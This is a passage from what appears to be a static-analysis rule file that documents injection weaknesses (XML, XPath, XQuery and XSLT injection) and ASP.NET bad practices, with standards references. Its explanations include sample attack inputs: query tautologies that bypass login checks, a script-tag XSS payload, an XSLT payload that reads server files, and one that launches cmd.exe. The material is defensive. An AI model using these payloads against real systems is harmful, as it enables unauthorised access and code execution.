<code>shoes&lt;/item&gt;&lt;price&gt;1.00&lt;/price&gt;&lt;item&gt;shoes</code>. The new XML would look like:<br><pre><br>&lt;order&gt;<br>   &lt;price&gt;100.00&lt;/price&gt;<br>   &lt;item&gt;shoes&lt;/item&gt;&lt;price&gt;1.00&lt;/price&gt;&lt;item&gt;shoes&lt;/item&gt;<br>&lt;/order&gt;<br></pre><br><br>When using SAX parsers, the value from the second <code>&lt;price&gt;</code> overrides the value from the first <code>&lt;price&gt;</code> tag. This allows the attacker to purchase a pair of $100 shoes for $1.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3810 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3810 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3810 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3810 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 91</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[16] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[17] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_xpath_injection</key>
    <internalKey>Input Validation and Representation/XPath Injection</internalKey>
    <name>XPath Injection</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Constructing a dynamic XPath query with user input may allow an attacker to modify the statement's meaning. 
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  XPath injection occurs when:<br><br>1.       Data enters a program from an untrusted source.<br><br><br><IfDef var="ConditionalDescriptions"><br> <br></IfDef><br><br>2.       The data used to dynamically construct an XPath query.<br><br><br><br><b>Example 1:</b> The following code dynamically constructs and executes an XPath query that retrieves an e-mail address for a given account ID.  The account ID is read from an HTTP request, and is therefore untrusted.<br><br><pre><br>...<br>string acctID = Request[&quot;acctID&quot;];<br>string query = null;<br>if(acctID != null) {<br>       StringBuffer sb = new StringBuffer(&quot;/accounts/account[acctID='&quot;);<br>       sb.append(acctID);<br>       sb.append(&quot;']/email/text()&quot;);<br>       query = sb.toString();<br>}<br><br>XPathDocument docNav = new XPathDocument(myXml);<br>XPathNavigator nav = docNav.CreateNavigator();<br>nav.Evaluate(query);<br>...<br></pre><br><br>Under normal conditions, such as searching for an e-mail address that belongs to the account number 1, the query that this code executes will look like the following:<br><br><code>/accounts/account[acctID='1']/email/text()</code><br><br>However, because the query is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if <code>acctID</code> does not contain a single-quote character. If an attacker enters the string <code>1' or '1' = '1</code> for <code>acctID</code>, then the query becomes the following:<br><br><code>/accounts/account[acctID='1' or '1' = '1']/email/text()</code><br><br>The addition of the <code>1' or '1' = '1</code> condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:<br><br><code>//email/text()</code><br><br>This simplification of the query allows the attacker to bypass the requirement that the query only return items owned by the authenticated user; the query now returns all e-mail addresses stored in the document, regardless of their specified owner.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 643</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[16] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[17] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[18] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>XPath Injection</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_xquery_injection</key>
    <internalKey>Input Validation and Representation/XQuery Injection</internalKey>
    <name>XQuery Injection</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Constructing a dynamic XQuery expression with user input could allow an attacker to modify the statement's meaning. 
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  XQuery injection occurs when:<br><br>  1.      Data enters a program from an untrusted source.<br><br>  <br>  <IfDef var="ConditionalDescriptions"><br>   <br>  </IfDef><br><br>  2.      The data used to dynamically construct an XQuery expression.<br><br>  <br><br>  <b>Example 1:</b> The following code dynamically constructs and executes an XQuery expression that retrieves an user for a given username and password combination. The username and password are read from an HTTP request, and is therefore untrusted.<br><br>  <pre><br>  ...<br><br>  String squery = "for \$user in doc(users.xml)//user[username='" + Request[&quot;username&quot;] + "'and pass='" + Request[&quot;password&quot;] + "'] return \$user";<br><br>  Processor processor = new Processor();<br><br>  XdmNode indoc = processor.NewDocumentBuilder().Build(new Uri(Server.MapPath("users.xml")));<br><br>  StreamReader query = new StreamReader(squery);<br>  XQueryCompiler compiler = processor.NewXQueryCompiler();<br>  XQueryExecutable exp = compiler.Compile(query.ReadToEnd());<br>  XQueryEvaluator eval = exp.Load();<br>  eval.ContextItem = indoc;<br><br>  Serializer qout = new Serializer();<br>  qout.SetOutputProperty(Serializer.METHOD, "xml");<br>  qout.SetOutputProperty(Serializer.DOCTYPE_PUBLIC, "-//W3C//DTD XHTML 1.0 Strict//EN");<br>  qout.SetOutputProperty(Serializer.DOCTYPE_SYSTEM, "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd");<br>  qout.SetOutputProperty(Serializer.INDENT, "yes");<br>  qout.SetOutputProperty(Serializer.OMIT_XML_DECLARATION, "no");<br><br>  qout.SetOutputWriter(Response.Output);<br>  eval.Run(qout);<br><br>  ...<br>  </pre><br><br>  Under normal conditions, such as searching for an user with the appropriate username and password, the expression that this code executes will look like the following:<br><br>  <code>for \$user in doc(users.xml)//user[username='test_user' and pass='pass123'] return \$user</code><br><br>  However, because the expression is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if <code>username</code> or <code>password</code> does not contain a single-quote character. If an attacker enters the string <code>admin' or 1=1 or ''='</code> for <code>username</code>, then the query becomes the following:<br><br>  <code>for \$user in doc(users.xml)//user[username='admin' or 1=1 or ''='' and password='x' or ''=''] return \$user</code><br><br>  The addition of the <code>admin' or 1=1 or ''='</code> condition causes the XQuery expression to always evaluate to true, so the query becomes logically equivalent to the much simpler query:<br><br>  <code>//user[username='admin']</code><br><br>  This simplification of the query allows the attacker to bypass the requirement that the query match the password; the query now returns the admin user stored in the document, regardless of the entered password.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 652</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[16] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[17] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>input_validation_and_representation_xslt_injection</key>
    <internalKey>Input Validation and Representation/XSLT Injection</internalKey>
    <name>XSLT Injection</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Processing an unvalidated XSL stylesheet can allow an attacker to change the structure and contents of the resultant XML, include arbitrary files from the file system, or execute arbitrary code.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  XSLT injection occurs when:<br><br>  1. Data enters a program from an untrusted source.<br>  <br>  <IfDef var="ConditionalDescriptions"><br>   <br>  </IfDef><br><br>  2. The data is written to an XSL stylesheet.<br>  <br><br>  Applications typically use XSL stylesheet to transform XML documents from one format to another.  XSL stylesheets include special functions which enhance the transformation process but introduce additional vulnerabilities if used incorrectly.<br><br>  The semantics of XSL stylesheets and processing can be altered if an attacker has the ability to write XSL elements in a stylesheet. An attacker could alter the output of a stylesheet such that a XSS (cross-site scripting) attack was enabled, expose the contents of local file system resources, or execute arbitrary commands.  If the attacker had complete control over the stylesheet submitted to the application, then the attacker could also execute an XXE (Xml eXternal Entity) injection attack.<br><br>  <b>Example 1:</b> Here is some code that is vulnerable to XSLT Injection:<br><br>  <pre><br>  ...<br>  String xmlUrl = Request[&quot;xmlurl&quot;];<br>  String xslUrl = Request[&quot;xslurl&quot;];<br><br>  XslCompiledTransform xslt = new XslCompiledTransform();<br>  xslt.Load(xslUrl);<br><br>  xslt.Transform(xmlUrl, "books.html");<br>  ...<br>  </pre><br><br>  The code above results in three different exploits when the attacker can pass the identified XSL to the XSTL processor:<br><br>  1.  XSS:<br><br>  <code><br><br>  &lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;<br>    &lt;xsl:template match="/"&gt;<br>      &lt;script&gt;alert(123)&lt;/script&gt;<br>    &lt;/xsl:template&gt;<br>  &lt;/xsl:stylesheet&gt;<br><br>  </code><br><br>  When the XSL stylesheet is processed, the &lt;script&gt; tag is rendered to the victim's browser allowing a cross-site scripting attack to be performed.<br><br>  2.  Reading of arbitrary files on the server's file system:<br><br>  <code><br><br>  &lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;<br>    &lt;xsl:template match="/"&gt;<br>      &lt;xsl:copy-of select="document('file:///c:/winnt/win.ini')"/&gt;<br>    &lt;/xsl:template&gt;<br>  &lt;/xsl:stylesheet&gt;<br><br>  </code><br><br>  The above XSL stylesheet will return the contents of the /etc/passwd file.<br><br>  3.  Execution of arbitrary code:<br><br>  The XSLT processor has the ability to expose native language methods as XSLT functions if they are not disabled.<br><br>  <code><br><br>  &lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:App="http://www.tempuri.org/App"&gt;<br>    &lt;msxsl:script implements-prefix="App" language="C#"&gt;<br>      &lt;![CDATA[<br>        public string ToShortDateString(string date)<br>          {<br>              System.Diagnostics.Process.Start("cmd.exe");<br>              return "01/01/2001";<br>          }<br>      ]]&gt;<br>    &lt;/msxsl:script&gt;<br>    &lt;xsl:template match="ArrayOfTest"&gt;<br>      &lt;TABLE&gt;<br>        &lt;xsl:for-each select="Test"&gt;<br>          &lt;TR&gt;<br>          &lt;TD&gt;<br>            &lt;xsl:value-of select="App:ToShortDateString(TestDate)" /&gt;<br>          &lt;/TD&gt;<br>          &lt;/TR&gt;<br>        &lt;/xsl:for-each&gt;<br>      &lt;/TABLE&gt;<br>    &lt;/xsl:template&gt;<br>  &lt;/xsl:stylesheet&gt;<br><br>  </code><br><br>  The above stylesheet will execute the "cmd.exe" command run on the server.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 631</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[16] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[17] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>input-validation-and-representation</tag>
  </rule>
  <rule>
    <key>security_features_asp_net_bad_practices_use_of_impersonation_context</key>
    <internalKey>Security Features/ASP.NET Bad Practices/Use of Impersonation Context</internalKey>
    <name>ASP.NET Bad Practices: Use of Impersonation Context</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Impersonating user credentials could allow an attacker to gain unauthorized access to protected resources.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Microsoft ASP.NET applications can impersonate the security context of the current user or the process that invoked them in order to execute privileged operations. Although impersonation contexts serve a variety of useful purposes, such as reducing the overall number of authentication attempts that must be made, a program that retains elevated privileges unnecessarily poses a risk to the overall security of the system. If an attacker exploits another vulnerability in the program while it is running in another security context, any unauthorized operations the attacker performs will be executed with the corresponding privileges.<br><br><b>Example 1:</b> The following code example represents a typical use pattern for impersonating credentials using the <code>WindowsIdentity.Impersonate()</code> method.<br><br><pre><br>using System.Security.Principal;<br>...<br><br>//Get the identity of the current user<br>IIdentity contextId = HttpContext.Current.User.Identity;<br>WindowsIdentity userId = (WindowsIdentity)contextId;<br><br>//Temporarily impersonate<br>WindowsImpersonationContext imp = userId.Impersonate();<br><br>//Perform tasks using the caller's security context<br>DoSecuritySensitiveTasks();<br><br>//Clean up and restore our old security context<br>impersonate.Undo();<br></pre><br><br>The code in Example 1 impersonates the current user's security context and uses it to perform a privileged operation. After calling <code>DoSecuritySensitiveTasks()</code>, the code attempts to restore the original security context, but if <code>DoSecuritySensitiveTasks()</code> throws an exception, the <code>Undo()</code> method will never be called and the program will continue to use the impersonated security context.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3480.1 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3480.1 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3480.1 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3480.1 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3480.1 CAT II</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 520</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authorization</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.3</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[18]  <em>Security Practices: ASP.NET 2.0 Security Practices at a Glance</em> Microsoft Corporation<br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>security-features</tag>
  </rule>
  <rule>
    <key>security_features_asp_net_mvc_bad_practices_controller_action_without_antiforgery_validation</key>
    <internalKey>Security Features/ASP.NET MVC Bad Practices/Controller Action Without AntiForgery Validation</internalKey>
    <name>ASP.NET MVC Bad Practices: Controller Action Without AntiForgery Validation</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The controller action may benefit from antiforgery validation.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  ASP.NET MVC provides a convenient way to better protect an application against cross-site request forgery by adding an antiforgery token at the form side and validating that antiforgery token at the controller.  If used, this token is usually included as a hidden form field and validated when the form is submitted, which increases the chances that a request is from your application and not forged.<br><br>The following controller code does not include the built-in defense against cross-site request forgery:<br><br><pre><br>public ActionResult ActionName(Model model, string returnurl)<br>{<br>  // ... controller logic<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A5 Cross Site Request Forgery (CSRF)</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A5 Cross-Site Request Forgery (CSRF)</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A8 Cross-Site Request Forgery (CSRF)</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3585 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3585 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3585 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3585 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3585 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Cross-Site Request Forgery</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 352</em> <br></p>
																									   <p>[11]  <em>HtmlHelper.AntiForgeryToken Method </em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 352</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 352</em> <br></p>
																									   <p>[14] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Insecure Interaction - CWE ID 352</em> <br></p>
																									   <p>[15] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[19] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-23 Session Authenticity (P1)</em> <br></p>
																									   <p>[20]  <em>ValidateAntiForgeryTokenAttribute Class</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>security-features</tag>
  </rule>
  <rule>
    <key>security_features_asp_net_mvc_bad_practices_form_without_antiforgery_token</key>
    <internalKey>Security Features/ASP.NET MVC Bad Practices/Form Without AntiForgery Token</internalKey>
    <name>ASP.NET MVC Bad Practices: Form Without AntiForgery Token</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The Razor view contains a form but does not include an antiforgery token with that form and therefore may be more susceptible to cross-site request forgery.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  ASP.NET MVC provides a convenient way to better protect an application against cross-site request forgery by adding an antiforgery token at the HTML form and validating that antiforgery token at the controller.  If used, this token is usually included as a hidden form field and validated when the form is submitted, which increases the chances that a request is from your application and not forged.<br><br>Generally, a programmer should include this antiforgery token since it increases the cost of malicious scripting against an application.<br><br>The following Razor code creates a form in the resulting HTML without the built-in defense against cross-site request forgery:<br><br><pre><br>@using (Html.BeginForm(new { ReturnUrl = ViewBag.ReturnUrl })) {<br>  // ... form elements<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A5 Cross Site Request Forgery (CSRF)</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A5 Cross-Site Request Forgery (CSRF)</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A8 Cross-Site Request Forgery (CSRF)</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3585 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3585 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3585 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3585 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3585 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Cross-Site Request Forgery</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 352</em> <br></p>
																									   <p>[11]  <em>HtmlHelper.AntiForgeryToken Method</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 352</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 352</em> <br></p>
																									   <p>[14] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Insecure Interaction - CWE ID 352</em> <br></p>
																									   <p>[15] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[19] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-23 Session Authenticity (P1)</em> <br></p>
																									   <p>[20]  <em>ValidateAntiForgeryTokenAttribute Class</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>security-features</tag>
  </rule>
  <rule>
    <key>security_features_asp_net_misconfiguration_header_checking_disabled_header_checking_disabled</key>
